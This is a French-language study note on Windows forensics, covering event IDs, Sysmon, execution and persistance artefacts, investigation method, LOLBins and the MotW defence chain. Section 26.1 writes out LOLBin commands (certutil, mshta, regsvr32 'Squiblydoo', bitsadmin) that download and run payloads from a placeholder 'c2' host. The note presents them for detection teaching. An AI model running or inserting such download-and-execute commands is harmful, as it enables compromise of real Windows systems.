---
title: Partie VI — Event logs, artefacts et forensic
source: IT/02 Windows/Comprendre Windows/Windows en profondeur.md
note: Windows en profondeur
up:
- - Windows en profondeur
  - index.md
---

---


## Chapitre 21 — Event Logs Windows

### 21.1 Architecture

Les journaux sont stockés au format **EVTX** (XML binaire) dans `C:\Windows\System32\winevt\Logs`. On les lit avec l'Observateur d'événements (`eventvwr.msc`), `Get-WinEvent` ou, en investigation, EvtxECmd.

| Journal | Contenu |
|---|---|
| **Security** | Authentifications, comptes, privilèges, création de processus (si l'audit est activé) |
| **System** | Services, pilotes, démarrages et arrêts |
| **Application** | Événements des applications |
| **Microsoft-Windows-PowerShell/Operational** | Script Block (4104), modules (4103) |
| **Microsoft-Windows-Sysmon/Operational** | Télémétrie Sysmon (Ch.22) |
| **Microsoft-Windows-TaskScheduler/Operational**, **TerminalServices-***, **Windows Defender/Operational** | Tâches planifiées, RDP, détections antivirus |

### 21.2 Les événements de référence

| Event ID | Journal | Signification |
|---|---|---|
| 4624 / 4625 | Security | Ouverture de session réussie / échouée |
| 4634 / 4647 | Security | Fermeture de session |
| 4648 | Security | Ouverture de session avec identifiants explicites |
| 4672 | Security | Privilèges spéciaux attribués (session administrateur) |
| 4688 | Security | Création de processus (avec ligne de commande si activée) |
| 4697 / 7045 | Security / System | Service installé |
| 4698 | Security | Tâche planifiée créée |
| 4720 / 4732 | Security | Compte créé / ajout à un groupe local |
| 1102 | Security | Journal de sécurité effacé |
| 4104 | PowerShell | Bloc de script exécuté |

**Les types d'ouverture de session (4624, champ *Logon Type*) :**

| Type | Signification | Exemple |
|---|---|---|
| 2 | Interactif | Clavier, console |
| 3 | Réseau | Accès à un partage SMB |
| 4 | Batch | Tâche planifiée |
| 5 | Service | Démarrage d'un service |
| 7 | Déverrouillage | Retour sur une session verrouillée |
| 8 | Réseau en clair | Authentification HTTP basique |
| 9 | Nouveaux identifiants | `runas /netonly` |
| 10 | Interactif à distance | RDP |
| 11 | Identifiants mis en cache | Ouverture hors connexion |

### 21.3 Configurer correctement

- **Advanced Audit Policy** par GPO : Logon/Logoff, Account Logon, Account Management, Detailed Tracking (création de processus), Policy Change, Object Access selon les besoins ;
- **ligne de commande dans 4688** : GPO *Include command line in process creation events* — sans elle, on sait qu'un programme a été lancé, pas ce qu'il a fait ;
- **taille des journaux** : les valeurs par défaut font écraser les événements en quelques heures sur un serveur actif ; augmenter (Security à plusieurs centaines de Mo ou plus) ;
- **centralisation** : WEF ou agent SIEM — un journal local peut être effacé (1102 le signale, mais trop tard).

```powershell
# Dernières ouvertures de session échouées
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 20

# Créations de processus de la dernière heure
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddHours(-1)}
```


---


## Chapitre 22 — Sysmon et télémétrie avancée

### 22.1 Ce qu'apporte Sysmon

**Sysmon** (Sysinternals) est un service et un pilote qui enrichissent la journalisation native : il ajoute le hash des binaires, le processus parent, les connexions réseau par processus, les chargements de DLL, les requêtes DNS… Son événement 1 est bien plus riche que le 4688 natif.

| Event ID | Événement | Usage |
|---|---|---|
| **1** | Création de processus (hash, ligne de commande, parent, utilisateur) | L'événement le plus utilisé |
| **3** | Connexion réseau | Processus → IP:port |
| **6** | Pilote chargé | Pilotes signés mais vulnérables |
| **7** | Image (DLL) chargée | Chargements anormaux |
| **8** | Thread distant créé | Interactions entre processus |
| **10** | Accès à un processus | Accès à `lsass.exe` |
| **11** | Fichier créé | Dépôts dans `%TEMP%`, `ProgramData` |
| **12 / 13 / 14** | Registre : création, modification, renommage | Persistance |
| **15** | Flux alternatif créé | ADS, Mark of the Web |
| **19 / 20 / 21** | Abonnements WMI | Persistance WMI |
| **22** | Requête DNS | Domaines contactés par processus |
| **23 / 26** | Fichier supprimé | Nettoyage de traces |
| **25** | Altération de processus | Image en mémoire différente du disque |

### 22.2 La configuration

Sysmon ne journalise que ce que sa configuration XML demande. Deux bases communautaires servent de point de départ : **SwiftOnSecurity/sysmon-config** (équilibrée) et **olafhartong/sysmon-modular** (modulaire). Une configuration trop large noie le SIEM, trop étroite crée des angles morts : on l'ajuste à l'environnement.

```text
sysmon64.exe -accepteula -i config.xml   # installation
sysmon64.exe -c config.xml               # mise à jour de la configuration
```


### 22.3 Déploiement et limites

Déploiement par GPO, SCCM ou Intune ; journal `Microsoft-Windows-Sysmon/Operational` collecté vers le SIEM. Sysmon tourne avec des privilèges élevés mais un administrateur de la machine peut l'arrêter ou le désinstaller : la disparition soudaine de ses événements est elle-même un signal à surveiller. Sysmon observe, il ne bloque pas : il complète un EDR, il ne le remplace pas.

---


## Chapitre 23 — Artefacts forensic : exécution et persistance

### 23.1 « Ce programme a-t-il été exécuté ? »

Aucun artefact ne répond seul : on les croise.

| Artefact | Emplacement | Ce qu'il apporte | Outil | Limite |
|---|---|---|---|---|
| **Prefetch** | `C:\Windows\Prefetch\*.pf` | Première et dernières exécutions (jusqu'à 8), nombre d'exécutions, fichiers chargés | PECmd | Désactivé sur certains serveurs ; 1 024 fichiers max |
| **Amcache** | `C:\Windows\AppCompat\Programs\Amcache.hve` | Chemin, SHA-1, éditeur, date | AmcacheParser | Présence ≠ exécution certaine |
| **ShimCache** (AppCompatCache) | Ruche SYSTEM | Chemin, date de modification du fichier | AppCompatCacheParser | Depuis Windows 10, prouve la présence, pas l'exécution |
| **BAM / DAM** | Ruche SYSTEM | Dernière exécution par utilisateur | RECmd | Quelques jours de rétention |
| **UserAssist** | `NTUSER.DAT` | Programmes lancés depuis l'Explorateur, compteur, dates (noms encodés en ROT13) | RECmd, Registry Explorer | Lancements via l'interface seulement |
| **SRUM** | `C:\Windows\System32\sru\SRUDB.dat` | Consommation CPU et réseau par application, sur 30 à 60 jours | SrumECmd | Agrégé par heure |
| **4688 / Sysmon 1** | Journaux | Ligne de commande, parent, utilisateur | EvtxECmd | Seulement si activés |

### 23.2 Les emplacements de persistance

| Famille | Où regarder | Événement associé |
|---|---|---|
| Registre | Run / RunOnce (HKLM, HKCU), Winlogon, IFEO, AppInit_DLLs, CLSID COM | Sysmon 12/13 |
| Services | `HKLM\SYSTEM\CurrentControlSet\Services` | 7045, 4697 |
| Tâches planifiées | `C:\Windows\System32\Tasks`, journal TaskScheduler | 4698 |
| Dossiers de démarrage | `…\Start Menu\Programs\Startup` (utilisateur et commun) | Sysmon 11 |
| WMI | Abonnements filtre / consommateur | Sysmon 19/20/21 |
| BITS | Travaux de transfert persistants | Journal BITS-Client |

**Autoruns** (Sysinternals) liste tous ces emplacements d'un coup ; l'option de masquage des entrées signées Microsoft et la vérification VirusTotal accélèrent le tri.

---


## Chapitre 24 — Artefacts forensic : fichiers, réseau et mémoire

### 24.1 Fichiers et navigation

| Artefact | Emplacement | Ce qu'il prouve | Outil |
|---|---|---|---|
| **$MFT** | Racine du volume NTFS | Tous les fichiers, y compris supprimés récemment, avec horodatages | MFTECmd |
| **$UsnJrnl:$J** | `$Extend` | Créations, renommages, suppressions | MFTECmd |
| **LNK** | `%APPDATA%\Microsoft\Windows\Recent` | Fichiers ouverts, chemin d'origine, volume, dates | LECmd |
| **Jump Lists** | `…\Recent\AutomaticDestinations` | Fichiers récents par application | JLECmd |
| **Shellbags** | `NTUSER.DAT`, `UsrClass.dat` | Dossiers parcourus, même supprimés ou sur clé USB | ShellBags Explorer |
| **Corbeille** | `C:\$Recycle.Bin\<SID>` | `$I` = métadonnées, `$R` = contenu | RBCmd |
| **Zone.Identifier** | ADS du fichier | Origine du téléchargement (Mark of the Web) | `Get-Content -Stream Zone.Identifier` |
| **Navigateurs** | Bases SQLite des profils | Historique, téléchargements | Hindsight, outils dédiés |

### 24.2 Réseau

Cache DNS (`ipconfig /displaydns`, volatil), connexions actives (`Get-NetTCPConnection`, `netstat -anob`), profils réseau et Wi-Fi connus (registre `NetworkList`), consommation réseau par application (SRUM), journaux du pare-feu Windows s'ils sont activés.

### 24.3 Mémoire

La mémoire vive contient ce que le disque ignore : processus en cours (y compris dissimulés), connexions, commandes, code chargé uniquement en mémoire. On la capture **avant** d'éteindre (WinPMem, DumpIt, Magnet RAM Capture) et on l'analyse avec **Volatility 3** (Ch.30). `pagefile.sys` et `hiberfil.sys` en contiennent aussi des fragments.

---


## Chapitre 25 — Investigation Windows : méthodologie structurée

### 25.1 Les cinq étapes

```text
1. Préserver   → mémoire d'abord (volatile), puis image disque ; hash SHA-256 ; chaîne de conservation
2. Trier       → la machine est-elle compromise, et par quoi ? (les 10-30 premières minutes)
3. Chronologie → fusionner journaux, Prefetch, Amcache, $MFT/$UsnJrnl, LNK, registre
4. Approfondir → suivre chaque piste : origine du fichier, exécution, connexions, persistance, latéralisation
5. Conclure    → indicateurs, chronologie, vecteur initial, impact, recommandations
```


### 25.2 Le triage rapide

| Question | Où regarder |
|---|---|
| Quels processus sont anormaux ? | Arbre de processus, chemins, signatures (Process Explorer, Ch.31) |
| Avec qui la machine parle-t-elle ? | Connexions actives, cache DNS, Sysmon 3/22 |
| Qu'est-ce qui survit au redémarrage ? | Autoruns, services récents (7045), tâches (4698) |
| Qui s'est connecté, comment ? | 4624 (types 3 et 10), 4648, 4672 |
| Qu'est-ce qui a été exécuté récemment ? | Prefetch, 4688 / Sysmon 1, PowerShell 4104 |

### 25.3 Analyse à chaud ou à froid

| | À chaud (*live*) | À froid (*dead*) |
|---|---|---|
| Avantage | Accès à la mémoire et à l'état courant | Intégrité préservée, analyse reproductible |
| Inconvénient | Chaque commande modifie le système | Données volatiles perdues |
| Bonne pratique | Capturer la mémoire en premier | Travailler sur une copie, jamais sur l'original |

### 25.4 Les outils

| Outil | Usage |
|---|---|
| **KAPE** | Collecte ciblée des artefacts et traitement automatisé, en quelques minutes |
| **Velociraptor** | Agent et serveur : collecte et chasse sur tout le parc (requêtes VQL) |
| **Suite Eric Zimmerman** | Parsers d'artefacts (PECmd, MFTECmd, EvtxECmd, RECmd…) et Timeline Explorer |
| **Autopsy** | Plateforme d'analyse de disques |
| **Volatility 3** | Analyse mémoire |

---


## Chapitre 26 — LOLBins, fileless et chaîne MotW→SmartScreen→ASR

### 26.1 Les LOLBins (Living-off-the-Land Binaries)

Binaires Microsoft légitimes détournés pour exécuter du code malveillant : **certutil** (téléchargement + décodage base64 — certutil -urlcache -split -f http://c2/payload.dll), **mshta** (exécution de HTA/VBScript — mshta http://c2/payload.hta), **rundll32** (exécution de fonctions DLL — le vecteur du fil rouge), **regsvr32** (chargement de COM scriptlets depuis une URL — « Squiblydoo » — regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll), **bitsadmin** (téléchargement via BITS — bitsadmin /transfer job http://c2/payload.exe %TEMP%\payload.exe), **wmic** (exécution via WMI — wmic process call create "payload.exe"), **cmstp** (bypass UAC + exécution), **msiexec** (exécution de packages MSI depuis une URL). Chaque LOLBin a ses traces : Sysmon 1 avec la command line suspecte, Sysmon 3 si connexion réseau depuis un LOLBin.

### 26.2 Les techniques fileless

Code exécuté uniquement en mémoire — jamais écrit sur le disque : PowerShell IEX (le code est téléchargé et exécuté en mémoire), .NET reflection (Assembly.Load charge du code .NET en mémoire), Reflective DLL Loading (Ch.9). Pas de hash fichier, pas de scan AV basé sur fichier → la détection repose sur le comportement (EDR), la journalisation (Script Block Logging capture le code PowerShell même fileless), et ETW.

### 26.3 La chaîne de défense MotW → SmartScreen → Protected View → ASR

*Pour les attaques par phishing initial (le vecteur n°1), cette chaîne est le bloc défensif central de Windows.*

Le **Mark of the Web (MotW)** : quand un fichier est téléchargé depuis Internet ou reçu par email, Windows écrit un ADS Zone.Identifier contenant la source (ZoneId=3 = Internet). Ce marquage déclenche toute la chaîne suivante. **SmartScreen** : quand un fichier avec MotW est exécuté, SmartScreen vérifie la réputation du fichier (hash) et de l'URL source auprès de Microsoft → fichier inconnu ou malveillant = avertissement ou blocage. **Office Protected View** : quand un document Office avec MotW est ouvert, il s'ouvre en mode lecture seule (sandbox) — les macros ne s'exécutent PAS tant que l'utilisateur ne clique pas « Activer la modification ». **Macro restrictions** (GPO : bloquer les macros dans les documents provenant d'Internet — la mesure la plus efficace contre le phishing avec macro ; depuis 2022, Microsoft bloque par défaut les macros VBA dans les documents avec MotW). **ASR** (Attack Surface Reduction rules — Defender) : règles qui bloquent des comportements spécifiques même si le code s'exécute (bloquer les processus enfants de Office, bloquer les appels Win32 depuis les macros, bloquer l'exécution de scripts obfusqués, bloquer le téléchargement de contenu exécutable).

Les attaquants contournent la chaîne en **supprimant le MotW** (archives .zip/.rar qui ne préservent pas le MotW dans certaines versions, images disque .iso/.img qui ne marquent pas les fichiers extraits, contournements de SmartScreen — CVE-2023-36025, CVE-2024-21412). Chaque contournement de MotW est une CVE critique car il casse toute la chaîne de protection.

---
